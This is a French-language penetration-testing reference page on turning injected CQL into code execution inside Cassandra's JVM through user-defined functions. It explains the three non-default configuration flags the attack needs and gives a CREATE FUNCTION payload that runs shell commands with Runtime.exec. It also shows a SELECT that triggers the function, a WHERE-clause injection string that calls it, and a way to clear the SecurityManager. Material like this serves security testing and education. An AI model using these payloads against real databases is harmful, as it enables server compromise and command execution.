---
title: "Abus de fonction définie par l'utilisateur : exécution de code via des fonctions CQL injectées"
description: "Lorsque les fonctions définies par l'utilisateur sont activées, un CREATE FUNCTION ou CREATE AGGREGATE injecté avec un corps Java exécute du code de l'attaquant à l'intérieur de la JVM Cassandra."
keywords:
  - fonction définie par l'utilisateur CQL
  - CREATE FUNCTION
  - CREATE AGGREGATE
  - exécution de code Cassandra
  - abus d'UDF
---

# Abus de fonction définie par l'utilisateur

CQL permet aux opérateurs de définir des fonctions dans la base de données avec `CREATE FUNCTION` et des agrégats avec `CREATE AGGREGATE`. Lorsque cette fonctionnalité est activée et que le point d'injection peut atteindre du DDL, un attaquant définit une fonction dont le corps est du code arbitraire et l'exécute à l'intérieur de la JVM du serveur Cassandra.

## La condition d'activation

Les fonctions définies par l'utilisateur ne s'exécutent que lorsque la configuration du nœud les active :

```yaml
enable_user_defined_functions: true
```

Par défaut c'est désactivé, et l'activer est nécessaire mais pas suffisant, car un second réglage est le véritable bac à sable :

```yaml
enable_user_defined_functions_threads: true   # default
```

Avec les threads activés (le défaut), chaque corps d'UDF s'exécute dans un thread dédié sous un `SecurityManager` Java auquel **aucune** permission n'est accordée, donc `Runtime.exec`, la réflexion et l'accès aux fichiers ou aux sockets lèvent tous une `AccessControlException`. Un corps `LANGUAGE java` ordinaire qui appelle `Runtime.getRuntime().exec` est bloqué d'emblée sur un tel nœud. L'exécution de code nécessite le réglage non par défaut `enable_user_defined_functions_threads: false`, qui exécute les UDF directement dans le thread du daemon sous un `SecurityManager` avec permissions. La primitive fiable dans ce cas est une UDF scriptée (JavaScript/Nashorn) dont le corps désactive le `SecurityManager` par réflexion avant d'agir, et les UDF scriptées ont besoin de leur propre indicateur non par défaut également :

```yaml
enable_scripted_user_defined_functions: true   # default false; required for LANGUAGE javascript
```

Donc le chemin RCE complet repose sur trois réglages non par défaut réunis (`enable_user_defined_functions`, `enable_user_defined_functions_threads: false`, `enable_scripted_user_defined_functions`). L'exemple Java ci-dessous est la forme du payload, pas quelque chose qui réussit sur un nœud au bac à sable par défaut.

## Définir une fonction malveillante

Lorsque l'injection atteint une frontière d'instruction capable de porter du DDL, un `CREATE FUNCTION` avec un corps Java plante le code :

```sql
CREATE FUNCTION app.exec(cmd text)
  RETURNS NULL ON NULL INPUT
  RETURNS text
  LANGUAGE java
  AS $$
    try {
      Process p = Runtime.getRuntime().exec(cmd);
      java.util.Scanner s = new java.util.Scanner(p.getInputStream()).useDelimiter("\\A");
      return s.hasNext() ? s.next() : "";
    } catch (Exception e) { return e.toString(); }
  $$;
```

L'appeler exécute alors la commande et, comme la fonction renvoie du `text`, peut renvoyer la sortie dans un `SELECT` :

```sql
SELECT app.exec('id') FROM system.local;
```

`system.local` est une table à une seule ligne présente sur chaque nœud, ce qui en fait un déclencheur pratique pour un appel unique. Sur un nœud avec le bac à sable de thread par défaut, cet appel renvoie une `AccessControlException` plutôt que la sortie de la commande. Une fois les trois indicateurs non par défaut ci-dessus définis, le corps pratique est la forme **JavaScript** (Nashorn) obsolète, `LANGUAGE javascript`, qui atteint d'abord par réflexion pour effacer le `SecurityManager` actif (`System.setSecurityManager(null)`) et seulement ensuite invoque `Runtime.getRuntime().exec`, de sorte que la commande suivante s'exécute sans restriction dans la JVM du compte de service.

## Atteindre le DDL depuis l'injection

`CREATE FUNCTION` est une instruction DDL autonome, pas un fragment de `WHERE`, et un `BATCH` CQL n'accepte que `INSERT`, `UPDATE` et `DELETE`, donc il ne peut pas porter de DDL. Planter une UDF nécessite donc un point d'injection qui soumet une instruction complète à part entière : une interface d'administration ou de construction de requêtes qui exécute du CQL choisi par l'attaquant, ou un pilote configuré pour accepter plusieurs instructions par requête. Le schéma en deux étapes est une requête qui définit la fonction et une seconde qui l'appelle, ce qui contourne aussi la limite d'une instruction unique par requête du protocole natif.

## Appeler une UDF malveillante existante

Lorsqu'une fonction utilisable existe déjà, qu'elle soit définie par un opérateur ou plantée plus tôt, l'injection n'a qu'à l'appeler. Une référence de fonction se glisse directement dans une projection `SELECT` ou une comparaison `WHERE` :

```sql
' AND app.exec('whoami') = 'x' ALLOW FILTERING /*
```

Même lorsque le résultat n'est pas renvoyé, l'effet de bord (l'exécution de la commande) se produit tout de même, et la sortie peut être récupérée via le même canal booléen décrit dans [Inférence en aveugle](cql/blind.md) en comparant la valeur renvoyée caractère par caractère.

## Les agrégats pour l'état

`CREATE AGGREGATE` combine une fonction d'état avec une fonction finale sur un ensemble de résultats, ce qui permet à un corps de s'exécuter une fois par ligne et d'accumuler un état à travers un scan. C'est utile lorsqu'un appel unique est contraint mais qu'un scan sur une table est atteignable, transformant chaque ligne traitée en une nouvelle exécution du corps injecté.

## Outils

- **cqlsh** : définir et invoquer le payload CREATE FUNCTION contre le cluster.
- **Burp Repeater** : délivrer le DDL et l'appel de suivi via le point d'injection.

## Références

- [Apache Cassandra: CREATE FUNCTION](https://cassandra.apache.org/doc/latest/cassandra/developing/cql/functions.html#create-function-statement)
- [Apache Cassandra: CREATE AGGREGATE](https://cassandra.apache.org/doc/latest/cassandra/developing/cql/functions.html#aggregate-functions)
- [PayloadsAllTheThings: NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
